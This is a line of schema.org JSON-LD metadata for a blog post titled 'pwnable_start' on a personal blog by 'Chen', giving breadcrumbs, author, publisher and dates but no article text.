+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/wp/","name":"wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/12/04/pwnable-start/","name":"pwnable_start"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"pwnable_start","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/12/04/pwnable-start/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/12/04/pwnable-start/","wordCount":0,"datePublished":"2022-12-04T12:54:30.000Z","dateModified":"2022-12-05T05:29:08.607Z","articleSection":"wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
